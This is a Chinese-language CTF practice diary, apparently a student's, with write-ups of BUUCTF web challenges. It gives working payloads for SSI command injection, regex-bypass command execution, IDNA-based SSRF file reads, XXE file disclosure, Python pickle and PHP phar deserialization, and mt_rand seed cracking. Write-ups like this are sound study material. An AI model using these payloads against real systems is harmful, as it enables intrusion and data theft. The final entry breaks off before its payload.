然后用`include("php://filter/convert.base64-encode/resource=/FIag_!S_it");`读出来就可以了![](C:\Users\11634\AppData\Roaming\Typora\typora-user-images\image-20210721205714699.png)

base64解一下得到flag：NPUCTF{this_is_not_a_fake_flag_but_true_flag}，但是提交失败了0-0看来是个假flag

然后看了一下wp发现在phpinfo搜flag就可以了，非常无语

![](https://i.loli.net/2021/07/21/Q4kwW5YjZtNXMq7.png)



## 2021.7.23

### [BJDCTF2020]EasySearch

登录框，没有注册，sql注入无果，找一下备份文件
(最近老是碰到这个--)
index.php.swp文件（产生原因有：1使用多个程序编辑同一文件；2非常规退出）

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

重点：`if ( $admin == substr(md5($_POST['password']),0,6)) 且 $admin='6d0bc1';`
也就是说要求传入的 password经md5hash后的前6位==6d0bc1，写个脚本跑一下就好

```python
import hashlib
a = "0123456789qwertyuiopasdfghjklzxcvbnm"
for o in a:
    for p in a:
        for q in a:
            for r in a:
                for s in a:
                    for t in a:
                        for u in a:
                            b = str(o)+str(p)+str(q)+str(r)+str(s)+str(t)+str(u)
                            md5 = hashlib.md5(b.encode('utf-8')).hexdigest()
                            if ((md5[0:6])=='6d0bc1'):
                                print(b)
```

```python
# 看到学姐的wp，很精简的脚本，两个脚本差别就是这个是纯数字暴力跑
import hashlib
def md5(s):
    return hashlib.md5(s.encode('utf-8')).hexdigest()
for i in range(1, 10000000):
    if md5(str(i)).startswith('6d0bc1'):
        print(i)
        break
```

然后拿跑出的结果作密码，随便输入一个用户名就可以登录了：
![](https://i.loli.net/2021/07/23/2JHTWPscfrmnXGp.png)再看源码`$file_shtml = "public/".get_hash().".shtml";`，会得到一个shtml路径（并且我们的用户名会被输入其中)![](https://s2.loli.net/2022/03/09/xLtBDn6kXaePZb4.png)

访问一下路径![image-20210723154535518](https://i.loli.net/2021/07/23/KH91NMplRgtAxGn.png)后面没思路了--，看了一下wp是[Apache SSI 远程命令执行漏洞](https://cloud.tencent.com/developer/article/1540513)

> SSI（服务器端包含）是放置在HTML页面中的指令，并在服务页面时在服务器上对其进行评估。它们使您可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面
> 那么将指令放置到现有的HTML页面中
>
> ```html
> <!--#echo var="DATE_LOCAL" -->
> ```
>
> 那么页面就会被替换为其值：Tuesday, 15-Jan-2013 19:28:54 EST
>
> （SSI注入的条件：
> 1.Web 服务器已支持SSI（服务器端包含）
> 2.Web 应用程序未对对相关SSI关键字做过滤
> 3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）

根据源码可知，我们的username会被写入到shtml文件中，那么构造payload传入username即可执行命令：

```
password=000e6wc&username=<!--#exec cmd="whoami"-->
```

最终找到flag在index同级目录下：

```
password=000e6wc&username=<!--#exec cmd="ls ../"-->
```

![](https://i.loli.net/2021/07/23/VeTgkluvBQr6IWS.png)

访问flag_990c66bf85a09c664f0b6741840499b2即可：
flag{5a85477f-2e74-40b1-ad46-899a6a5c646b}



### [MRCTF2020]套娃

F12打开就有源代码

![](https://i.loli.net/2021/07/23/1oGUEWuBgHpRXmz.png)

> 关于$_SERVER['QUERY_STRING']取值_
> 如： http://localhost/aaa/?a=233 那么`$_SERVER['QUERY_STRING'] = "a=233";`

1、`if(substr_count($query,'_')!==0 || substr_count($query,'%5f')!=0)`
利用substr_count()计算 `_` 和 `%5f`在传入值中出现的次数，可以用` (空格)`或`.`(php会将空格和.替换为下划线_)以及`%5F`(大写)绕过

2、`if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t']))`
强比较b_u_p_t不为字符串23333，且符合正则匹配23333，这里用^和$匹配一行的头和尾，也就可以使用换行%0a来匹配正则，但不等于字符串23333

payload：

```
?b%5Fu%5Fp%5Ft=23333%0a
```

![](https://i.loli.net/2021/07/23/feh2UNdVoQgGOyB.png)可以知道flag在secrettw.php里，访问得到：![](https://i.loli.net/2021/07/23/vcgySVoMNmDjJiK.png)

直接用了一下XFF，但是不行，查看源代码可以看到jsfuck，控制台传一下：![](https://i.loli.net/2021/07/23/WQbtGZJTxzCmwhp.png)让我们post一个Merak，得到源码：

```php
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';	# flag所在

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ # 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?> 
```

要求IP=127.0.0.1 且 GET传一个2333=todat is a happy day，都是强比较；
而file_get_content的对象是file经change加密后的值，即应使传入的值经过change加密后为flag.php才能得flag

解决：
IP可以利用XFF或者Client-ip（XFF被ban了）
2333传参可以利用伪协议data://或者php://input
而file的传值需要我们反写函数来获得

payload：

```
1、	Client-ip=127.0.0.1
2、
	GET?2333=data://text/plain,todat is a happy day
	或
	GET：?2333=php://input
	POST：todat is a happy day
```

3、反写change函数

```php
<?php
highlight_file(__FILE__);

$v = "flag.php"; 
$re = ''; 
for($i=0;$i<strlen($v);$i++){ 
    $re .= chr ( ord ($v[$i]) - $i*2 );
} 
var_dump(base64_encode($re));
# ZmpdYSZmXGI=
```

那么再传入flie=ZmpdYSZmXGI=即可

![](https://i.loli.net/2021/07/23/iFVOHMxnfgaYD6K.png)

右键查看源代码即得flag



## 2021.7.24

### [GWCTF 2019]枯燥的抽奖

要我们猜字符，已经给出了一部分，需要知道全部20位![](https://i.loli.net/2021/07/24/dUGiuSQP1eIapkO.png)

查看源代码，看到有check.php
涉及到mt_srand()和mt_rand()，ctfshow做过，利用mt_srand()分发seed种子，然后mt_rand()根据种子生成随机数

```php
<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']); # 设定了seed，那么生成的随机数每次都是一样的
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php");
```

这里可以利用[php_mt_seed - PHP mt_rand() seed cracker (openwall.com)](https://www.openwall.com/php_mt_seed/)将其爆破出来，但是上述代码将随机数更改过形式，我们需要反写一下代码，让它变成php_mt_seed可识别的形式（因为mt_rand生成的都是数字）

```python
str1 ='lICSg0Pw3J'
str2 ='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
str3 = str1[::-1]
length = len(str1)
res = ''
for i in range(len(str1)):
    for j in range(len(str2)):
        if str1[i] == str2[j]:
            res += str(j)+' '+str(j)+' '+'0'+' '+str(len(str2)-1)+' '
            break
print(res)
```

![](https://i.loli.net/2021/07/24/N34MA7I5kUFSehB.png)

然后根据对应的版本本地跑一下：（php7.1.0+）

```php
<?php
mt_srand(204254302); 
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
var_dump($str);
```

![](https://i.loli.net/2021/07/24/7TAGioKSRbrh9HI.png)

提交即可：![](https://i.loli.net/2021/07/24/MpEX9uV6FGwI2b3.png)



### [SUCTF 2019]Pythonginx

有一个url的提交框还有一些代码

```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname	# 利用urlparse将url的各部分分割
    
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    
    parts = list(urlsplit(url))		# urlsplit和urlparse类似，这里存在漏洞
    host = parts[1]
    
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
   
    <!-- Dont worry about the suctf.cc. Go on! -->
    <!-- Do you know the nginx? -->
```

#### 利用idna对字符的处理	

​	1、会进行3次对host是否等于suctf.cc的判断，前两次匹配都会直接return，而在第三次判断匹配时才会执行读取文件的操作，因此要绕过前两次判断，匹配第三次
在二到三的判断之间，url经过decode('utf-8')之后又经urlunsplit()和urlparse()，会出现编码问题

​	2、`newhost.append(h.encode('idna').decode('utf-8'))`
这句话可以在GitHub搜到：https://github.com/python-hyper/hyperlink/issues/19`

```python
>>> "℅".encode("idna")
b'c/o'
```

在unicode中字符`℅`经idna处理会变成`c/o`，那么传入`http://xxx℅.com`就会变成`http://xxxc/o.com`，那么传入特殊字符代替suctf.cc的部分字符即可

因为要读文件，而题目提示nginx，应该就是读一下nginx的配置文件，一些nginx路径：

> 配置文件存放目录：/etc/nginx  or  /usr/local/nginx
>
> 主配置文件：/etc/nginx/conf/nginx.conf  or  /usr/local/nginx/conf/nginx.conf
>
> 管理脚本：/usr/lib64/systemd/system/nginx.service
>
> 模块：/usr/lisb64/nginx/modules
>
> 应用程序：/usr/sbin/nginx
>
> 程序默认存放位置：/usr/share/nginx/html
>
> 日志默认存放位置：/var/log/nginx

这里用file协议：file://suctf.cc/usr/local/nginx/conf/nginx.conf，利用℆替代c/u

像这样的编码问题一般都可以跑脚本寻找可以编码，这里抄一下网上的：

```python
# coding:utf-8
for i in range(128,65537):
    tmp=chr(i)
    try:
        res = tmp.encode('idna').decode('utf-8')
        if("-") in res:
            continue
        print("U:{}    A:{}      ascii:{} ".format(tmp, res, i))
    except:
        pass
```

一些可用符号

```
U:ℭ    A:c      ascii:8493    ℭ可以替换suctf.cc中的c
U:Ⓣ    A:t      ascii:9417     Ⓣ可以替换suctf.cc中的t
```

那么传入payload：`xxx/getUrl?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf`

![](https://i.loli.net/2021/07/24/AmTJloPxIUi2wuq.png)看到flag在/usr/fffffflag
利用同样的方法读取：`xxx/getUrl?url=file://suctf.c℆sr/fffffflag` 即可得到flag![](https://i.loli.net/2021/07/24/KEDd9HCboB8QS74.png)

#### 利用urlunsplit

urlunsplit会将我们传入的url进行分割
如：`http://xxx.com` 经`list(parse.urlsplit(url))`变成 `['http', 'xxx.com', '', '', '']`，也就是会去掉//
那么传入`http:////xxx.com`就会得到`['http', '', '//xxx.com', '', '']`即解析域名（host）处为空，也就可以绕过前两次上述对host的判断；
然后经urlunsplit又会变成`http://xxx.com`

由此得到payload：

```
xxx/getUrl?url=file:////suctf.cc/usr/local/nginx/conf/nginx.conf
xxx/getUrl?url=file:////suctf.cc/usr/fffffflag
```

## 2021.7.25

### [FBCTF2019]RCEService

要求输入json格式的命令；[JSON 数据格式 - SkySoot - 博客园](https://www.cnblogs.com/skysoot/archive/2012/04/17/2453010.html)![](https://i.loli.net/2021/07/25/UzuRmfqvIbEwl9h.png)

传入一个键值对：`{"cmd":"ls"}`，即可执行命令，会看到当前目录仅1个index.php
fuzz可以看到ban了很多东西，然后看了wp不懂源码怎么找到的。。都说是网上来的

```php
<?php
# 利用putenv编辑环境变量
putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

这里的preg_match()进行正则匹配只会匹配第一行，可以利用换行符`%0a`来绕过
那就可以构建payload：`{%0a"cmd":"ls /home/rceservice/jail"%0a}`

可以看到当前环境变量里只有一个ls命令，可以调用全局环境变量/bin下的命令来拿flag![](https://i.loli.net/2021/07/25/vltQ8hEr4FnOjsV.png)

> linux下命令位置：
> /bin、/usr/bin（全局用户可用）
> /sbin、/usr/sbin（root用户可用）

payload：

```json
{%0a"cmd":"ls /home/rceservice"%0a}
{%0a"cmd":"/bin/cat /home/rceservice/flag"%0a}
```

![](https://i.loli.net/2021/07/25/3av5BGs7wJSPgju.png)

![](https://s2.loli.net/2022/03/09/2Zfxm3Cj1qFgQPI.png)

#### preg_match()绕过

1. 数组绕过：因为preg_match只能处理字符串，传入数组将返回false

2. 换行符%0a绕过：如上形如`preg_match("/^.*flag.*$/",$cmd)`，因为^和$匹配一行的头和尾，所以可以用%0a绕过：`%0acat flag`

3. 利用PCRE回溯次数限制绕过 就是当正则匹配回溯次数超过上限时将返回false
   具体看p神这篇：[PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

   本题也可以使用此方法：

   ```python
   import requests
   payload = '{"cmd":"/bin/cat /home/rceservice/flag ","hhh":"' + "a"*(1000000) + '"}'
   r = requests.post("http://e24e97dc-9c1c-4529-91a3-5af3f7431947.node4.buuoj.cn/", data={"cmd": payload})
   print(r.text)
   ```

   ![](https://i.loli.net/2021/07/25/tma4AYPjgGdW1XS.png)



## 2021.7.27

### [CISCN2019 华北赛区 Day1 Web2]ikun

1. 要买到 LV6,右键查看一下图片，命名就是lv1-6.png；在url中控制翻页?page=1![](https://i.loli.net/2021/07/27/X5Tm4kQcDYSFfGL.png)
2. 跑一下脚本找到所在页数就可以：跑了一下有500页，找到在181页但是钱不够

```python
import requests
url = 'http://26f50d0e-8a80-4590-aa3b-ab7b3bd5f9b5.node4.buuoj.cn/shop?page='
for i in range(1, 500):
    r = requests.get(url+str(i))
    if 'lv6.png' in r.text:
        print(i)
        break
```

![](https://i.loli.net/2021/07/27/thwSX1xreRNQW6m.png)

3. 逻辑漏洞：购买需要注册帐号，注册一个，来到购物车看到有个折扣：
   ![](https://i.loli.net/2021/07/27/q2hRAi9reOo6c8G.png)抓包修改折扣，返回仅admin可以访问![](https://i.loli.net/2021/07/27/Js3hZ6HyUF9X8WB.png)

#### JWT

1. 抓包看到存在JWT信息 [JSON Web Token 入门教程 - 阮一峰的网络日志 (ruanyifeng.com)](http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html)

2. JWT解码：[JSON Web Tokens - jwt.io](https://jwt.io/) 可以看到用户名就是之前注册的用户名![](https://i.loli.net/2021/07/27/DQ6fPabsElRu41U.png)

3. 改为admin即可，但是还需要JWT签名的密钥进行加密
   用一下大牛的工具[GitHub - brendan-rius/c-jwt-cracker: JWT brute force cracker written in C](https://github.com/brendan-rius/c-jwt-cracker)
   ![](https://i.loli.net/2021/07/27/VyUW1xz85q9mTkj.png)得到密钥1Kun，将修改后的JWT传入
   ![](https://i.loli.net/2021/07/27/oAnvfsm64KBrGPg.png)



#### python反序列化

1. 查看源代码有源码泄漏![](https://i.loli.net/2021/07/27/HIDN5ZeOwt1Qs4F.png)

2. 后面就不会了--python反序列化和构建网站都没用过，看wp学习一下
   反序列化在/www/sshop/views/Admin.py

   ```python
   import tornado.web
   from sshop.base import BaseHandler
   import pickle
   import urllib
   
   
   class AdminHandler(BaseHandler):
       @tornado.web.authenticated
       def get(self, *args, **kwargs):
           if self.current_user == "admin":
               return self.render('form.html', res='This is Black Technology!', member=0)
           else:
               return self.render('no_ass.html')
   
       @tornado.web.authenticated
       def post(self, *args, **kwargs):
           try:
               become = self.get_argument('become')
               p = pickle.loads(urllib.unquote(become))	# 反序列化
               return self.render('form.html', res=p, member=1)
           except:
               return self.render('form.html', res='This is Black Technology!', member=0)
   ```

   > pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。  
   >
   > pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化， pickle序列化后的数据，可读性差，人一般无法识别。 
   >
   > p = pickle.loads(urllib.unquote(become)) urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 & key2 = value2的形式 
   >
   > pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回

   先看脚本：

   ```python
   # 这里要用py2；python3和python2用的协议不同（py3用3号，py2用0号）
   import pickle
   import urllib
   
   class payload(object):
       def __reduce__(self):
          return (eval, ("open('/flag.txt','r').read()",))
   
   a = pickle.dumps(payload())
   a = urllib.quote(a)
   print a
   ```

   将sheng生成的payload传入即可得到flag
   ![](https://i.loli.net/2021/07/27/Y1gaTpwcK27xIqj.png)

   [python 反序列化 ~ Misaki's Blog (misakikata.github.io)](https://misakikata.github.io/2020/04/python-反序列化/)
   [[CISCN2019 华北赛区 Day1 Web2\]ikun - 春告鳥 - 博客园 (cnblogs.com)](https://www.cnblogs.com/Cl0ud/p/12177062.html)
   [Python魔法方法指南_宇宙浪子的专栏-CSDN博客_python 魔法方法](https://blog.csdn.net/bluehawksky/article/details/79027055)



## 2021.7.29

考完试拉，校选也搞定了；
哈哈今天在校选课老师给看奥运直播，马龙和奥恰打的难解难分，比分让人窒息，但最后赢的时候更是激动人心；老师人也好好，最后总结也颇有感慨吧，最近琐事很多，一步一脚印吧。
算是告一段落，又刷题先
今天看两题xml的题目学习一下

[从XML相关一步一步到XXE漏洞 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6887)

[一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/3357)

### [NCTF2019]Fake XML cookbook——XXE

进去是登录框，右键源代码可以看到如下：![](https://i.loli.net/2021/07/29/8cg3SDZnwlVrUKv.png)

抓包，明显的xml实体，利用xml存储username和password
![](https://i.loli.net/2021/07/29/GjWiXBg3YQzy1v9.png)

因为没有任何过滤，xxe注入，使用file协议根据源码读flag即可
PS：这里的username=`&file`对应`<!ENTITY file SYSTEM "file:///flag">`里的实体名file
（`&xxx`表示在xml文档中引用；而`%xxx`是在DTDT中引用，那篇文章都有）

```xml-dtd
<?xml version = "1.0" encoding = "utf-8"?>
<!DOCTYPE hhh [
    <!ENTITY file SYSTEM "file:///flag">
]>
<user><username>&file;</username><password>123</password></user>
```

![](https://i.loli.net/2021/07/29/9kTVSw1vlGHjWC3.png)

### [NCTF2019]True XML cookbook——XXE

同一比赛的题
利用上题的payload打一下，是存在xxe注入的，只是根目录不存在flag所以报错了
![](https://i.loli.net/2021/07/29/NMVmnb3IvxrASc9.png)

看了wp，因为xxe能实现的攻击是文件读取，还有内网扫描
可以读`/etc/hosts`和`/proc/net/arp`
![](https://i.loli.net/2021/07/29/HSfuRQUlA215ZmD.png)

![](https://i.loli.net/2021/07/29/Xzp9CI8mi5Zg7FV.png)

读到一台主机ip：10.0.24.2，利用http协议访问，访问这个ip地址会报错，这里intruder爆破一下c段就行
![](https://i.loli.net/2021/07/29/IAvhL29rZp1tc5G.png)





## 2021.7.30

像一些签到题就不发了

### [CISCN2019 华北赛区 Day1 Web1]Dropbox——phar反序列化

注册登录，上传文件白名单，上传之后可以下载，任意文件下载，扒源码
![](https://i.loli.net/2021/07/30/yMVYfUIjXOLcBtF.png)

得穿越目录
![](https://i.loli.net/2021/07/30/Dcgq27OwjHLdUJl.png)

然后看源码都提到啥，就照着下一下
![](https://i.loli.net/2021/07/30/q9v5E61j8atAMPO.png)

还是seay，那优先看一下class.php
![](https://i.loli.net/2021/07/30/dlPtmeKh4LnUIjw.png)

```php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```

user类里的sql语句用了预编译，基本没有利用的可能

File类的close方法有个file_get_content()，如果能控制filename，也许可以读出flag；
再看一下如何触发，User类的_destruct()方法会调用close()
Filelist类存在可利用的call方法`$this->results[$file->name()][$func] = $file->$func();`，并且该类本身没有close方法

那么定义一个user类的对象，其db属性为类Filelist的实例，`$this->db->close();`就是执行Filelist->close()，但Filelist没有close方法，由此触发FileList->_call()，进而遍历文件找close方法，找到File->close()就会执行file_get_contene，令其filename为flag，然后利用FileList->_destruct()输出结果即可

顺序就是：
`user->__destruct()  --->  Filelist->close()  --->  Filelist->__call('close')  --->  File->close('/flag.txt')  --->  results=file_get_contents('flag.txt')  --->   FileList->_destruct()`

而在File类的open方法中调用了file_exists($filename)，且可以上传文件（虽然有白名单不能直接传phar，但phar伪协议解析时会将gif当作phar解析，因此改成gif后缀即可）那么利用一下phar反序列化

payloiad：

```php
<?php
class User {
    public $db;
}
class File {
    public $filename;
}
class FileList {
    private $files;
    public function __construct() {
        $file = new File();
        $file->filename = "/flag.txt";
        $this->files = array($file);
    }
}
$a = new User();
$a->db = new FileList();
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new User();
$o->db = new FileList();
$phar->setMetadata($a);
$phar->addFromString("exp.txt", "exp");
$phar->stopBuffering();
?>
```

然后本地访问php即可生成phar文件,修改后缀为gif
上传，然后点击删除，抓包，改文件名为`phar://phar.gif`即可
（ps：这里要注意在php.ini里把phar.readonly 必须设置为 Off，还有把前面的注释符 `;` 去掉）

![](https://i.loli.net/2021/07/30/LZWsPwxT8uj3zMN.png)

> [CISCN2019 华北赛区 Day1 Web1 Dropbox - 云+社区 - 腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1813568)
>
> phar攻击的利用前提：
>
> 1.phar文件要能够上传到服务器端。
>
> 2.要有可用的魔术方法作为“跳板”。
>
> 3.文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。
>
> 可以进行利用的函数：
>
> ```php
> ìnclude($_GET['file']);
> fopen($_GET['file']);
> file_get_contents($_GET['file']);
> file($_GET['file']);
> file_exists($_GET['file']);
> md5_file($_GET['file']);
> filemtime($_GET['file']);
> filesize($_GET['file']);
> ```
>
> phar生成的模板：
>
> ```php
> <?php
>     class TestObject {
>     }
>     $phar = new Phar("phar.phar"); //后缀名必须为phar
>     $phar->startBuffering();
>     $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
>     $o = new TestObject();
>     $o -> data='hu3sky';
>     $phar->setMetadata($o); //将自定义的meta-data存入manifest
>     $phar->addFromString("test.txt", "test"); //添加要压缩的文件
>     //签名自动计算
>     $phar->stopBuffering();
> ?>
> ```
>
> meta-data是以序列化的形式存储的。有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，具体函数如上
>
> 当然也可以伪装成其他文件：
>
> ```php
> <?php
>     class TestObject {
> 
>     }
>     $phar = new Phar('phar.phar');
>     $phar -> startBuffering();
>     $phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');   //设置stub，增加gif文件头
>     $phar ->addFromString('test.txt','test');  //添加要压缩的文件
>     $object = new TestObject();
>     $object -> data = 'hu3sky';
>     $phar -> setMetadata($object);  //将自定义meta-data存入manifest
>     $phar -> stopBuffering();
> ?>
> ```



## 2021.7.31

总算回到家了

### [Zer0pts2020]Can you guess it?

直接给出源码：

```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
```

### 知识点

1. `$_SERVER['PHP_SELF']`，`PHP_SELF`表示当前php文件的相对路径（相对于网站根目录）
   ![](https://i.loli.net/2021/08/01/7W9mTUHpEKsO8h5.png)
2. `basename()`该函数会返回路径中的文件名部分，如：xxx/index.php 返回index.php
   - 且该函数和浏览器的处理存在差异，比方说 /a.php/b.php，浏览器解析为a.php，而basename会返回b.php
   - 来自php官方：使用默认的配置"C"，basename会在文件名开头丢弃那些非ASCII值



再看本题，secret是`bin2hex(random_bytes(64));`生成的随机字符串，比较时使用了`hash_equals()`来防止时序攻击，因此想利用传入guess=secret来获取flag是不可能的

但在开头可以看到，flag是被定义在config.php中，且get方法传入参数source，就会显示`basename($_SERVER['PHP_SELF'])`的内容；

按照上面所说的差异，我们可以构造`/index.php/config.php/?source`使得`basename($_SERVER['PHP_SELF'])`=config.php

但对PHP_SELF的正则匹配，规则为`'/config\.php\/*$/i'`将config.php过滤掉了

那么我们要做的就是绕过正则，这里利用basename去除文件名开头非ascii码的特性来构造payload：
